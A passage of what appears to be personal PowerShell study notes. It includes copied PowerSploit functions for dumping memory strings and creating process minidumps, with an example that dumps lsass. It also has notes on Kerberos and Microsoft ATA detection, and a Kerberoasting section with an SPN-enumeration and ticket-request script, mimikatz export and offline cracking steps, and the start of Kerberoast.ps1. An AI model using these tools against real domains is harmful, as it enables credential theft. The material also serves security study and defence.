# C:\PS>$module = $proc.Modules | ? { $_.ModuleName -eq 'ntdll.dll' }
# 
# C:\PS>$size = $module.ModuleMemorySize
# 
# C:\PS>$base = $module.BaseAddress
# 
# C:\PS>Dump-Strings $base $size -StringOffset -Encoding 'UNICODE'
# 
# 57416:LdrResFallbackLangList Enter
# 57448:LdrResFallbackLangList Exit
# 136960:KnownDllPath
# 136976:\KnownDlls
# 136992:\SystemRoot
# 137008:\System32\
# 183672:\Registry\Machine\System\CurrentControlSet\Control\MUI\Settings
# 183736::%u.%u.%u.%u
# 183856:%u.%u.%u.%u
# 183872::%u
# 184048:RtlpResUltimateFallbackInfo Enter
# 184088:svchost.exe
# 184104:\Registry\Machine\Software\Microsoft\SQMClient\Windows\DisabledProcesses\
# 184184:GlobalSession
# 184200:\Registry\Machine\Software\Microsoft\SQMClient\Windows\DisabledSessions\
# 
# 
# Description
# -----------
# This command prints all Unicode strings of length > 2 in the loaded module - ntdll.dll within the memory space of powershell.exe.
#.Link
# My blog: http://www.exploit-monday.com/
##################################################################
    [CmdletBinding()] Param (
        [Parameter(Position = 0, Mandatory = $True)] [System.IntPtr] $Address,
        [Parameter(Position = 1, Mandatory = $True)] [Int] $Offset,
        [Parameter()] [Int] $ProcessId,
        [Parameter()] [String] $Encoding = 'DEFAULT',
        [Parameter()] [Int] $MinimumLength = 3,
        [Parameter()] [Switch] $StringOffset
    )
    
    $BaseAddress = $Address.ToInt64()
        
    for ($PageOffset = 0; $PageOffset -lt $Offset; $PageOffset += 0x1000)
    {
        $PageBaseAddress = [IntPtr]($BaseAddress + $PageOffset)
            
        if ($ProcessId)
        {
            $MemProtect = Check-MemoryProtection $PageBaseAddress $ProcessId
        }
        else
        {
            $MemProtect = Check-MemoryProtection $PageBaseAddress
        }
            
        if ($MemProtect.Protect -eq [Winapi.Kernel32+AllocationProtectEnum]::PAGE_NOACCESS)
        {
            throw "Memory region at base address 0x$($PageBaseAddress.ToString('X16')) is inaccessible!`n `nMemory Protection Information:`n$($MemProtect | Out-String)`n `n"
        }
    }
    
    [Byte[]] $ByteArray = New-Object Byte[]($Offset)
    
    if ($ProcessId)
    {
        $BytesRead = 0
        $ProcHandle = [Winapi.Kernel32]::OpenProcess(([Winapi.Kernel32+ProcessAccessFlags]::PROCESS_VM_READ), 0, $ProcessId)
        [Winapi.Kernel32]::ReadProcessMemory($ProcHandle, $Address, $ByteArray, $Offset, $BytesRead) | Out-Null
        [Winapi.Kernel32]::CloseHandle($ProcHandle) | Out-Null
    }
    else
    {
        [System.Runtime.InteropServices.Marshal]::Copy($Address, $ByteArray, 0, $Offset)
    }
    
    if ($Encoding.ToUpper() -eq 'DEFAULT')
    {   # This hack will get the raw ascii chars. The System.Text.UnicodeEncoding object will replace some unprintable chars with question marks.
        $ArrayPtr = [System.Runtime.InteropServices.Marshal]::UnsafeAddrOfPinnedArrayElement($ByteArray, 0)
        $RawString = [System.Runtime.InteropServices.Marshal]::PtrToStringAnsi($ArrayPtr, $ByteArray.Length)
        $Regex = [regex] "[\x20-\x7E]{$MinimumLength,}"
        $Results = $Regex.Matches($RawString)
        # Unicode Regex
        $Encoder = New-Object System.Text.UnicodeEncoding
        $RawString = $Encoder.GetString($ByteArray,  0, $Offset)
        $Regex = [regex] "[\u0020-\u007E]{$MinimumLength,}"
        $Results += $Regex.Matches($RawString)
    }
    elseif ($Encoding.ToUpper() -eq 'ASCII')
    {   # This hack will get the raw ascii chars. The System.Text.UnicodeEncoding object will replace some unprintable chars with question marks.
        $ArrayPtr = [System.Runtime.InteropServices.Marshal]::UnsafeAddrOfPinnedArrayElement($ByteArray, 0)
        $RawString = [System.Runtime.InteropServices.Marshal]::PtrToStringAnsi($ArrayPtr, $ByteArray.Length)
        $Regex = [regex] "[\x20-\x7E]{$MinimumLength,}"
        $Results = $Regex.Matches($RawString)
    }
    else
    {   # Unicode Regex
        $Encoder = New-Object System.Text.UnicodeEncoding
        $RawString = $Encoder.GetString($ByteArray,  0, $Offset)
        $Regex = [regex] "[\u0020-\u007E]{$MinimumLength,}"
        $Results = $Regex.Matches($RawString)
    }
    
    if ($StringOffset)
    {
        $Results | ForEach-Object { "$($_.Index):$($_.Value)" }
    }
    else
    {
        $Results | ForEach-Object { "$($_.Value)" }
    }
}
#>
<#
function Out-Minidump
{
#
#.SYNOPSIS
#
#    Generates a full-memory minidump of a process.
#
#    PowerSploit Function: Out-Minidump
#    Author: Matthew Graeber (@mattifestation)
#    License: BSD 3-Clause
#    Required Dependencies: None
#    Optional Dependencies: None
#
#.DESCRIPTION
#
#    Out-Minidump writes a process dump file with all process memory to disk.
#    This is similar to running procdump.exe with the '-ma' switch.
#
#.PARAMETER Process
#
#    Specifies the process for which a dump will be generated. The process object
#    is obtained with Get-Process.
#
#.PARAMETER DumpFilePath
#
#    Specifies the path where dump files will be written. By default, dump files
#    are written to the current working directory. Dump file names take following
#    form: processname_id.dmp
#
#.EXAMPLE
#
#    Out-Minidump -Process (Get-Process -Id 4293)
#
#    Description
#    -----------
#    Generate a minidump for process ID 4293.
#
#.EXAMPLE
#
#    Get-Process lsass | Out-Minidump
#
#    Description
#    -----------
#    Generate a minidump for the lsass process. Note: To dump lsass, you must be
#    running from an elevated prompt.
#
#.EXAMPLE
#
#    Get-Process | Out-Minidump -DumpFilePath C:\temp
#
#    Description
#    -----------
#    Generate a minidump of all running processes and save them to C:\temp.
#
#.INPUTS
#
#    System.Diagnostics.Process
#
#    You can pipe a process object to Out-Minidump.
#
#.OUTPUTS
#
#    System.IO.FileInfo
#
#.LINK
#
#    http://www.exploit-monday.com/
#

    [CmdletBinding()]
    Param (
        [Parameter(Position = 0, Mandatory = $True, ValueFromPipeline = $True)]
        [System.Diagnostics.Process]
        $Process,

        [Parameter(Position = 1)]
        [ValidateScript({ Test-Path $_ })]
        [String]
        $DumpFilePath = $PWD
    )

    BEGIN
    {
        $WER = [PSObject].Assembly.GetType('System.Management.Automation.WindowsErrorReporting')
        $WERNativeMethods = $WER.GetNestedType('NativeMethods', 'NonPublic')
        $Flags = [Reflection.BindingFlags] 'NonPublic, Static'
        $MiniDumpWriteDump = $WERNativeMethods.GetMethod('MiniDumpWriteDump', $Flags)
        $MiniDumpWithFullMemory = [UInt32] 2
    }

    PROCESS
    {
        $ProcessId = $Process.Id
        $ProcessName = $Process.Name
        $ProcessHandle = $Process.Handle
        $ProcessFileName = "$($ProcessName)_$($ProcessId).dmp"

        $ProcessDumpPath = Join-Path $DumpFilePath $ProcessFileName

        $FileStream = New-Object IO.FileStream($ProcessDumpPath, [IO.FileMode]::Create)

        $Result = $MiniDumpWriteDump.Invoke($null, @($ProcessHandle,
                                                     $ProcessId,
                                                     $FileStream.SafeFileHandle,
                                                     $MiniDumpWithFullMemory,
                                                     [IntPtr]::Zero,
                                                     [IntPtr]::Zero,
                                                     [IntPtr]::Zero))

        $FileStream.Close()

        if (-not $Result)
        {
            $Exception = New-Object ComponentModel.Win32Exception
            $ExceptionMessage = "$($Exception.Message) ($($ProcessName):$($ProcessId))"

            # Remove any partially written dump files. For example, a partial dump will be written
            # in the case when 32-bit PowerShell tries to dump a 64-bit process.
            Remove-Item $ProcessDumpPath -ErrorAction SilentlyContinue

            throw $ExceptionMessage
        }
        else
        {
            Get-ChildItem $ProcessDumpPath
        }
    }

    END {}
}
#>
#endregion
#region Web Scraping
# The basic command that is used for web scraping is Invoke-WebRequest -Uri url.com
# The whole point is to use the fact that html has a pretty set structure in most cases and parse that in its pattern into usefull information
# Notice the properties that are returned such as links for all links in a page or images.
# For example try piping to see what link is what inner text the href on the webpage has
# EXAMPLE: $TheWebRequest.Links | select innerText,href
# Okay now say i wanna download all images from the web page
# EXAMPLE: $site = Invoke-WebRequest –Uri site.com –UseBasicParsing
# $site.Images.src
# @($site.Images.src).foreach({
# $fileName = $_ | Split-Path -Leaf
# Write-Host "Downloading image file $fileName"
# Invoke-WebRequest -Uri $_ -OutFile "C:$fileName"
# Write-Host 'Image download complete'
# })
#endregion
#endregion
#region Crypto Tests
#function GetAllCoinsFromMarket(){
#    $request =  Invoke-WebRequest -Uri "https://api.coinmarketcap.com/v1/ticker/"
#    $json = $request.Content
#    $table = @{}
#    $split  = $json.Split("{")
#    $split[1..$split.Count] | Foreach {$table[$_.Split('"')[3]] = @{id = $_.Split('"')[3];name = $_.Split('"')[7];symbol = $_.Split('"')[11];rank=$_.Split('"')[15];price_usd=$_.Split('"')[19];price_btc=$_.Split('"')[23];percent_change_1h = $_.Split('"')[43];percent_change_24h=$_.Split('"')[47];percent_change_7d=$_.Split('"')[51];}}
#    return $table
#}

# manually parsed the json to get me the properties into custom objects in the hash table of custom objects each represent a crypro currency key is the id of the coin value is the custom object
#endregion
#region Kerberos and Kerberos over Active Directory Domain Trust the Microsoft Version
# Kerberos

# Components:
# Client
# Service
# Service Principal Name (SPN)
# Key Distribution Center(KDC)
# Authentication Service (AS)
# Ticket Granting Service(TGS)

# Tickets:
# Ticket Granting Ticket (TGT)
# Service Ticket         (ST)

# Sub Protocols (REQ and REP):
# KRB_AS_REQ
# KRB_AS_REP
# KRB_TGS_REQ
# KRB_TGS_REP
# KRB_AP_REQ
# KRB_AP_REP

# Dependencies:
# Time
# OS
# TCP(Since windows Vista)
# AD
# SPN
# DNS
# Kerberos works TCP over port 88, This does not effect the application protocol(HTTP etc...)

# Keys:                        
# User Key                    -  When a user is created, the password is used to create the user key.
#                                The user key is stored with the user's object in the Active Directory.
#                                At the workstation, the user key is created when the user logs on.
#                                This key is the Hash of the Users Password
# Ticket Granting Service Key -  
# TGS Session Key             -  Keys that are disposed after that session 
# Service Key                 -  Services use a key based on the account password they use to log on
#                                All KDCs in the same realm use the same service key.
#                                This key is based on the password assigned to the krbtgt account.
#                                Every Active Directory domain will have this built-in account.
# Inter-realm keys            -  In order for cross-realm authentication to occur, the KDCs must share an inter-realm key.
#                                The realms can then trust each other because they share the key.
#                                This key is the trust password
# Session Key                 -  Keys that are disposed after that session

# Kerberos In Same Domain Steps:
# 1. User Hash to request TGT
# 2. TGT encrypted with krbtgt hash
# 3. TGS Request for Service Ticket
# 4. Service Ticket for server encrypted with Servers Account Hash
# 5. Present the Server with Service Ticket encoded with servers account hash
# 6. (Optional)  When the client on the user's workstation receives KRB_AP_REP,
#                Tt decrypts the service's authenticator with the session key it shares with the service and compares the time returned by the service with the time in the client's original authenticator.
#                If the times match, the client knows that the service is genuine.
#(PAC - Privilege Attribute Certificate, User SID + Groups and nested clams and other login info inside the service ticket this is used to create the users access token)

# Kerberos With a Trusted Domain Steps:
# 1. User Hash to request TGT
# 2. TGT encrypted with krbtgt hash
# 3. TGS Request for Service Ticket
# 4. Inter Realm TGT encrypted with Inter Realm Trust Key(The trust password)
# 5. TGS request for server with inter realm TGT
# 6. Service ticket for server encoded with servers account hash
# 7. Present the Server with Service Ticket encoded with servers account hash

# Random Facts:
# Machine Account password is rerandomed every 30 days
# Microsoft currently uses MD4 to hash credentials, STEALING THE HASH IS LIKE STEALING THE PASSWORD thats why its weakly hashed
# Session key is by default for 10 hours
# Unicodepwd - the attribute in the computer account and the user account that stores the password
# When you gpupdate it creates a kerberos ticket as well, you will see it on klist
# \\127.0.0.1 - is NTLM
# \\FQDN or \\HOSTNAME is Kerberos
# RID Master Role gives 500 SIDs to a DC as an RID pool by default, DCs ask to renew if the pool is at half capacity
# How does the KDC determine exacly what key to use when encrypting these service tickets? -> SPN!
# The DCs in the domain with the application has the SPN. Host based spns are auto generated for built in services...
# in reallity SPNs are only created for the host service and all built in services use that.
# When a domain user requests access to \\FQDN\C$  the KDC maps this request to Host\FQDN SPN, this means that the hash of the target machine
# that exists both in NTDS.DIT and localy on the host. This is used to encrypt the server part of the TGS. Then the ticket is presented to target host
# and that host determines if access is permited.
#endregion
#region Im Reading About ATA and Active Directory
#region ATA - Advances Threat Analytics
# How does ATA work - It uses a network parsing engine to capture and parse network traffic of multiple protocols(for example Kerberos,DNS,RPC,NTLM,etc...)
# To do this the ata does Port mirroring from Domain Controllers and DNS servers to the ATA Gateway
# And/or, Deploying an ATA Lightweight Gateway (LGW) directly on Domain Controllers
# Port mirroring is used on a network switch to send a copy of network packets seen on one switch port (or an entire VLAN) to a network monitoring connection on another switch port
# ATA could also get info from logs and events on the network.
# This is in order to learn the behavior of users and other entities in the organization.
# ATA can take logs from:
# 1.SIEM Integration
# 2.Windows Event Forwarding(WEF)
# 3.Directly from the Windows Event Collector (for the Lightweight Gateway)
# What does ATA do?
# ATA technology detects multiple suspicious activities, focusing on several phases of the cyber-attack kill chain including:
# Reconnaissance                 - attacker gathers information on how the environment is built, what the different assets are, and which entities exist. They generally building their plan for the next phases of the attack.
# Lateral movement cycle         - attacker invests time and effort in spreading their attack surface inside your network.
# Domain dominance (persistence) - attacker captures the information allowing them to resume their campaign using various sets of entry points, credentials, and techniques. 
# ATA searches for 3 types of activities:
# 1.Malicious attacks
# 2.Abnormal behavior
# 3.Security issues and risks
# ATA sits on a giant mongoDB
# ATA Components:
# 1. ATA Center              - The ATA Center receives data from any ATA Gateways and/or ATA Lightweight Gateways
#     Manages ATA Gateway and ATA Lightweight Gateway configuration settings
#     Receives data from ATA Gateways and ATA Lightweight Gateways 
#     Detects suspicious activities
#     Runs ATA behavioral machine learning algorithms to detect abnormal behavior
#     Runs various deterministic algorithms to detect advanced attacks based on the attack kill chain
#     Runs the ATA Console
#     The ATA Center can be configured to send emails and events when a suspicious activity is detected
#     ATA Center Components:
#         1.Entity Receiver            - Receives batches of entities from all ATA Gateways and ATA Lightweight Gateways
#         2.Network Activity Processor - Processes all the network activities within each batch received. For example, matching between the various Kerberos steps performed from potentially different computers
#         3.Entity Profiler 	       - Profiles all the Unique Entities according to the traffic and events. For example, ATA updates the list of logged-on computers for each user profile
#         4.Center Database 	       - Manages the writing process of the Network Activities and events into the database.
#         5.Database 	               - ATA utilizes MongoDB for purposes of storing all the data in the system:
#         A. Network activities
#         B. Event activities
#         C. Unique entities
#         D. Suspicious activities
#         E. ATA configuration
#         6.Detectors 	               - The Detectors use machine learning algorithms and deterministic rules to find suspicious activities and abnormal user behavior in your network
#         7.ATA Console 	           - The ATA Console is for configuring ATA and monitoring suspicious activities detected by ATA on your network. The ATA Console is not dependent on the ATA Center service and runs even when the service is stopped, as long as it can communicate with the database
# 2. ATA Gateway             - The ATA Gateway is installed on a dedicated server that monitors the traffic from your domain controllers using either port mirroring or a network TAP
# Gateway core functionality - The ATA Gateway and ATA Lightweight Gateway both have the same core functionality:
#    1. Capture and inspect domain controller network traffic. This is port mirrored traffic for ATA Gateways and local traffic of the domain controller in ATA Lightweight Gateways.
#    2. Receive Windows events from SIEM or Syslog servers, or from domain controllers using Windows Event Forwarding
#    3. Retrieve data about users and computers from the Active Directory domain
#    4. Perform resolution of network entities (users, groups, and computers)
#    5. Transfer relevant data to the ATA Center
#    6. Monitor multiple domain controllers from a single ATA Gateway, or monitor a single domain controller for an ATA Lightweight Gateway.
# Components:
#    1. Network Listener            - Captures network traffic and parsing the traffic.
#    2. Event Listener              - Captures and parsing Windows Events forwarded from a SIEM server on your network
#    3. Windows Event Log Reader    - Reads and parsing Windows Events forwarded to the ATA Gateway's Windows Event Log from the domain controllers.(or just locally with the lightweight)
#    4. Network Activity Translator - Translates parsed traffic into a logical representation of the traffic used by ATA (NetworkActivity)
#    5. Entity Resolver             - Takes the parsed data (network traffic and events) and resolves it data with Active Directory to find account and identity information.
#       It is then matched with the IP addresses found in the parsed data. The Entity Resolver inspects the packet headers efficiently, to enable parsing of authentication packets for machine names, properties, and identities. The Entity Resolver combines the parsed authentication packets with the data in the actual packet.
#    6. Entity Sender               - Sends the parsed and matched data to the ATA Center.
# 3. ATA Lightweight Gateway - The ATA Lightweight Gateway is installed directly on your domain controllers and monitors their traffic directly, without the need for a dedicated server or configuration of port mirroring. It is an alternative to the ATA Gateway
#     The following features work differently depending on whether you are running an ATA Gateway or an ATA Lightweight Gateway:
#         1. The ATA Lightweight Gateway can read events locally, without the need to configure event forwarding
#         2. Domain synchronizer candidate -
#             The domain synchronizer gateway is responsible for synchronizing all entities from a specific Active Directory domain proactively (similar to the mechanism used by the domain controllers themselves for replication). One gateway is chosen randomly, from the list of candidates, to serve as the domain synchronizer.
#             If the synchronizer is offline for more than 30 minutes, another candidate is chosen instead. If there is no domain synchronizer available for a specific domain, ATA is able to proactively synchronize entities and their changes, however ATA will reactively retrieve new entities as they are detected in the monitored traffic.
#             If there is no domain synchronizer available, and you search for an entity that did not have any traffic related to it, no search results are displayed.
#         3. Resource limitations          - The ATA Lightweight Gateway has resource limitations because it is installed on a DC
# Events: To enhance ATA detection of Pass-the-Hash, Brute Force, Modification to sensitive groups and Honey Tokens, ATA needs the following Windows events: 4776, 4732, 4733, 4728, 4729, 4756, 4757
# Suspicous activity guide - In microsofts ATA site there is a guide on how to investigate each alert
#endregion
#region Kerberoasting without mimikatz:
# We generally don’t care about host-based SPNs.
# As a computer’s machine account password is randomized by default and rotates every 30 days.
# Arbitrary SPNs can also be registered for domain user accounts as well. 
# If we have an arbitrary SPN that is registered for a domain user account,
# then the NTLM hash of that user’s account’s plaintext password is used for the service ticket creation.
# This is the key to Kerberoasting.
# Any user can request a TGS for any service that has a registered SPN (HOST or arbitrary) in a user or computer account in Active Directory.
# Remember that just requesting this ticket doesn’t grant access to the requesting user
# The server/service to ultimately determine whether the user should be given access.
# Because part of a TGS requested for an SPN instance is encrypted with the NTLM hash of a service account’s plaintext password,
# any user can request these TGS tickets and then crack the service account’s plaintext password offline.
# OLD METHOD
# Step 1
#region Function to find all spn for all service account
# [CmdletBinding()]
# Param(
#   [Parameter(Mandatory=$False,Position=1)] [string]$GCName,
#   [Parameter(Mandatory=$False)] [string]$Filter,
#   [Parameter(Mandatory=$False)] [switch]$Request,
#   [Parameter(Mandatory=$False)] [switch]$UniqueAccounts
# )
# 
# Add-Type -AssemblyName System.IdentityModel
# 
# $GCs = @()
# 
# If ($GCName) {
#   $GCs += $GCName
# } else { # find them
#   $ForestInfo = [System.DirectoryServices.ActiveDirectory.Forest]::GetCurrentForest()
#   $CurrentGCs = $ForestInfo.FindAllGlobalCatalogs()
#   ForEach ($GC in $CurrentGCs) {
#     #$GCs += $GC.Name
#     $GCs += $ForestInfo.ApplicationPartitions[0].SecurityReferenceDomain
#   }
# }
# 
# if (-not $GCs) {
#   # no Global Catalogs Found
#   Write-Host "No Global Catalogs Found!"
#   Exit
# }
# 
# <#
# Things you can extract
# Name                           Value
# ----                           -----
# admincount                     {1}
# samaccountname                 {sqlengine}
# useraccountcontrol             {66048}
# primarygroupid                 {513}
# userprincipalname              {sqlengine@medin.local}
# instancetype                   {4}
# displayname                    {sqlengine}
# pwdlastset                     {130410454241766739}
# memberof                       {CN=Domain Admins,CN=Users,DC=medin,DC=local}
# samaccounttype                 {805306368}
# serviceprincipalname           {MSSQLSvc/sql01.medin.local:1433, MSSQLSvc/sql01.medin.local}
# usnchanged                     {135252}
# lastlogon                      {130563243107145358}
# accountexpires                 {9223372036854775807}
# logoncount                     {34}
# adspath                        {LDAP://CN=sqlengine,CN=Users,DC=medin,DC=local}
# distinguishedname              {CN=sqlengine,CN=Users,DC=medin,DC=local}
# badpwdcount                    {0}
# codepage                       {0}
# name                           {sqlengine}
# whenchanged                    {9/22/2014 6:45:21 AM}
# badpasswordtime                {0}
# dscorepropagationdata          {4/4/2014 2:16:44 AM, 4/4/2014 12:58:27 AM, 4/4/2014 12:37:04 AM,...
# lastlogontimestamp             {130558419213902030}
# lastlogoff                     {0}
# objectclass                    {top, person, organizationalPerson, user}
# countrycode                    {0}
# cn                             {sqlengine}
# whencreated                    {4/4/2014 12:37:04 AM}
# objectsid                      {1 5 0 0 0 0 0 5 21 0 0 0 191 250 179 30 180 59 104 26 248 205 17...
# objectguid                     {101 165 206 61 61 201 88 69 132 246 108 227 231 47 109 102}
# objectcategory                 {CN=Person,CN=Schema,CN=Configuration,DC=medin,DC=local}
# usncreated                     {57551}
# #>
# 
# ForEach ($GC in $GCs) {
#     $searcher = New-Object System.DirectoryServices.DirectorySearcher
#     $searcher.SearchRoot = "LDAP://" + $GC
#     $searcher.PageSize = 1000
#     $searcher.Filter = "(&(!objectClass=computer)(servicePrincipalName=*))"
#     $searcher.PropertiesToLoad.Add("serviceprincipalname") | Out-Null
#     $searcher.PropertiesToLoad.Add("name") | Out-Null
#     $searcher.PropertiesToLoad.Add("samaccountname") | Out-Null
#     #$searcher.PropertiesToLoad.Add("userprincipalname") | Out-Null
#     #$searcher.PropertiesToLoad.Add("displayname") | Out-Null
#     $searcher.PropertiesToLoad.Add("memberof") | Out-Null
#     $searcher.PropertiesToLoad.Add("pwdlastset") | Out-Null
#     #$searcher.PropertiesToLoad.Add("distinguishedname") | Out-Null
# 
#     $searcher.SearchScope = "Subtree"
# 
#     $results = $searcher.FindAll()
#     
#     [System.Collections.ArrayList]$accounts = @()
#         
#     foreach ($result in $results) {
#         foreach ($spn in $result.Properties["serviceprincipalname"]) {
#             $o = Select-Object -InputObject $result -Property `
#                 @{Name="ServicePrincipalName"; Expression={$spn.ToString()} }, `
#                 @{Name="Name";                 Expression={$result.Properties["name"][0].ToString()} }, `
#                 #@{Name="UserPrincipalName";   Expression={$result.Properties["userprincipalname"][0].ToString()} }, `
#                 @{Name="SAMAccountName";       Expression={$result.Properties["samaccountname"][0].ToString()} }, `
#                 #@{Name="DisplayName";         Expression={$result.Properties["displayname"][0].ToString()} }, `
#                 @{Name="MemberOf";             Expression={$result.Properties["memberof"][0].ToString()} }, `
#                 @{Name="PasswordLastSet";      Expression={[datetime]::fromFileTime($result.Properties["pwdlastset"][0])} } #, `
#                 #@{Name="DistinguishedName";   Expression={$result.Properties["distinguishedname"][0].ToString()} }
#             if ($UniqueAccounts) {
#                 if (-not $accounts.Contains($result.Properties["samaccountname"][0].ToString())) {
#                     $accounts.Add($result.Properties["samaccountname"][0].ToString()) | Out-Null
#                     $o
#                     if ($Request) {
#                         New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $spn.ToString() | Out-Null
#                     }
#                 }
#             } else {
#                 $o
#                 if ($Request) {
#                     New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $spn.ToString() | Out-Null
#                 }
#             }
#         }
#     }
# }
#endregion
# Step 2
# After you get the Service account you want with the SPN u request the TGSs for these spasific SPNs with setspn.exe
# Step 3
# Extracting tickets from memory by invoking the kerberos list export on mimikatz
# Step 4
# Offline password crack with John the Ripper's or something(Rainbow tables and shit)
# New Method - The update is that this is now cetralizes and also does not need mimikatz to read from memory because theres a function to get the TGS by byte stream
#region harmjOy kerberoast
# <#
# Kerberoast.ps1
# Author: Will Schroeder (@harmj0y)
# License: BSD 3-Clause
# Required Dependencies: None
# 
# Note: the primary method of use will be Invoke-Kerberoast with
# various targeting options.
# 
# #>
# 
# function Get-DomainSearcher {
# <#
# .SYNOPSIS
# 
# Helper used by various functions that builds a custom AD searcher object.
# 
# Author: Will Schroeder (@harmj0y)
# License: BSD 3-Clause
# Required Dependencies: Get-NetDomain
# 
# .DESCRIPTION
# 
# Takes a given domain and a number of customizations and returns a
# System.DirectoryServices.DirectorySearcher object. This function is used
# heavily by other LDAP/ADSI search function.
# 
# .PARAMETER Domain
# 
# Specifies the domain to use for the query, defaults to the current domain.
# 
# .PARAMETER LDAPFilter
# 
# Specifies an LDAP query string that is used to filter Active Directory objects. 
# 
# .PARAMETER Properties
# 
# Specifies the properties of the output object to retrieve from the server.
# 
# .PARAMETER SearchBase
# 
# The LDAP source to search through, e.g. "LDAP://OU=secret,DC=testlab,DC=local"
# Useful for OU queries.
# 
# .PARAMETER SearchBasePrefix
# 
# Specifies a prefix for the LDAP search string (i.e. "CN=Sites,CN=Configuration").
# 
# .PARAMETER Server
# 
# Specifies an Active Directory server (domain controller) to bind to for the search.
# 
# .PARAMETER SearchScope
# 
# Specifies the scope to search under, Base/OneLevel/Subtree (default of Subtree).
# 
# .PARAMETER ResultPageSize
# 
# Specifies the PageSize to set for the LDAP searcher object.
# 
# .PARAMETER SecurityMasks
# 
# Specifies an option for examining security information of a directory object.
# One of 'Dacl', 'Group', 'None', 'Owner', 'Sacl'.
# 
# .PARAMETER Tombstone
# 
# Switch. Specifies that the searcher should also return deleted/tombstoned objects.
# 
# .PARAMETER Credential
# 
# A [Management.Automation.PSCredential] object of alternate credentials
# for connection to the target domain.
# 
# .EXAMPLE
# 
# Get-DomainSearcher -Domain testlab.local
# 
# Return a searcher for all objects in testlab.local.
# 
# .EXAMPLE
# 
# Get-DomainSearcher -Domain testlab.local -LDAPFilter '(samAccountType=805306368)' -Properties 'SamAccountName,lastlogon'
# 
# Return a searcher for user objects in testlab.local and only return the SamAccountName and LastLogon properties. 
# 
# .EXAMPLE
# 
# Get-DomainSearcher -SearchBase "LDAP://OU=secret,DC=testlab,DC=local"
# 
# Return a searcher that searches through the specific ADS/LDAP search base (i.e. OU).
# 
# .OUTPUTS
# 
# System.DirectoryServices.DirectorySearcher
# #>
# 
#     [OutputType('System.DirectoryServices.DirectorySearcher')]
#     [CmdletBinding()]
#     Param(
#         [Parameter(ValueFromPipeline = $True)]
#         [ValidateNotNullOrEmpty()]
#         [String]
#         $Domain,
# 
#         [ValidateNotNullOrEmpty()]
#         [Alias('Filter')]
#         [String]
#         $LDAPFilter,
#         
#         [ValidateNotNullOrEmpty()]
#         [String[]]
#         $Properties,
# 
#         [ValidateNotNullOrEmpty()]
#         [String]
#         $SearchBase,
# 
#         [ValidateNotNullOrEmpty()]
#         [String]
#         $SearchBasePrefix,
# 
#         [ValidateNotNullOrEmpty()]
#         [String]
#         $Server,
# 
#         [ValidateSet('Base', 'OneLevel', 'Subtree')]
#         [String]
#         $SearchScope = 'Subtree',
# 
#         [ValidateRange(1,10000)] 
#         [Int]
#         $ResultPageSize = 200,
# 
#         [ValidateSet('Dacl', 'Group', 'None', 'Owner', 'Sacl')]
#         [String]
#         $SecurityMasks,
# 
#         [Switch]
#         $Tombstone,
# 
#         [Management.Automation.PSCredential]
#         [Management.Automation.CredentialAttribute()]
#         $Credential = [Management.Automation.PSCredential]::Empty
#     )
# 
#     PROCESS {
# 
#         if ($Domain) {
#             $TargetDomain = $Domain
#         }
#         else {
#             $TargetDomain = (Get-NetDomain).name
#         }
# 
#         if ($Credential -eq [Management.Automation.PSCredential]::Empty) {
#             if (-not $Server) {
#                 try {
#                     # if there's no -Server specified, try to pull the primary DC to bind to
#                     $BindServer = ((Get-NetDomain).PdcRoleOwner).Name
#                 }
#                 catch {
#                     throw 'Get-DomainSearcher: Error in retrieving PDC for current domain'
#                 }
#             }
#         }
#         elseif (-not $Server) {
#             try {
#                 $BindServer = ((Get-NetDomain -Credential $Credential).PdcRoleOwner).Name
#             }
#             catch {
#                 throw 'Get-DomainSearcher: Error in retrieving PDC for current domain'
#             }
#         }
# 
#         $SearchString = 'LDAP://'
# 
#         if ($BindServer) {
#             $SearchString += $BindServer
#             if ($TargetDomain) {
#                 $SearchString += '/'
#             }
#         }
# 
#         if ($SearchBasePrefix) {
#             $SearchString += $SearchBasePrefix + ','
#         }
# 
#         if ($SearchBase) {
#             if ($SearchBase -Match '^GC://') {
#                 # if we're searching the global catalog, get the path in the right format
#                 $DN = $SearchBase.ToUpper().Trim('/')
#                 $SearchString = ''
#             }
#             else {
#                 if ($SearchBase -match '^LDAP://') {
#                     if ($SearchBase -match "LDAP://.+/.+") {
#                         $SearchString = ''
#                     }
#                     else {
#                         $DN = $SearchBase.Substring(7)
#                     }
#                 }
#                 else {
#                     $DN = $SearchBase
#                 }
#             }
#         }
#         else {
#             if ($TargetDomain -and ($TargetDomain.Trim() -ne '')) {
#                 $DN = "DC=$($TargetDomain.Replace('.', ',DC='))"
#             }
#         }
# 
#         $SearchString += $DN
#         Write-Verbose "Get-DomainSearcher search string: $SearchString"
# 
#         if ($Credential -ne [Management.Automation.PSCredential]::Empty) {
#             Write-Verbose "Using alternate credentials for LDAP connection"
#             $DomainObject = New-Object DirectoryServices.DirectoryEntry($SearchString, $Credential.UserName, $Credential.GetNetworkCredential().Password)
#             $Searcher = New-Object System.DirectoryServices.DirectorySearcher($DomainObject)
#         }
#         else {
#             $Searcher = New-Object System.DirectoryServices.DirectorySearcher([ADSI]$SearchString)
#         }
# 
#         $Searcher.PageSize = $ResultPageSize
#         $Searcher.SearchScope = $SearchScope
#         $Searcher.CacheResults = $False
# 
#         if ($Tombstone) {
#             $Searcher.Tombstone = $True
#         }
# 
#         if ($LDAPFilter) {
#             $Searcher.filter = $LDAPFilter
#         }
# 
#         if ($SecurityMasks) {
#             $Searcher.SecurityMasks = Switch ($SecurityMasks) {
#                 'Dacl' { [System.DirectoryServices.SecurityMasks]::Dacl }
#                 'Group' { [System.DirectoryServices.SecurityMasks]::Group }
#                 'None' { [System.DirectoryServices.SecurityMasks]::None }
#                 'Owner' { [System.DirectoryServices.SecurityMasks]::Owner }
#                 'Sacl' { [System.DirectoryServices.SecurityMasks]::Sacl }
#             }
#         }
# 
#         if ($Properties) {
#             # handle an array of properties to load w/ the possibility of comma-separated strings
#             $PropertiesToLoad = $Properties| ForEach-Object { $_.Split(',') } 
#             $Searcher.PropertiesToLoad.AddRange(($PropertiesToLoad))
#         }
# 
#         $Searcher
#     }
# }
# 
# 
# function Convert-LDAPProperty {
# <#
# .SYNOPSIS
# 
# Helper that converts specific LDAP property result fields and outputs
# a custom psobject.
# 
# Author: Will Schroeder (@harmj0y)
# License: BSD 3-Clause
# Required Dependencies: None
# 
# .DESCRIPTION
# 
# Converts a set of raw LDAP properties results from ADSI/LDAP searches
# into a proper PSObject. Used by several of the Get-Net* function.
# 
# .PARAMETER Properties
# 
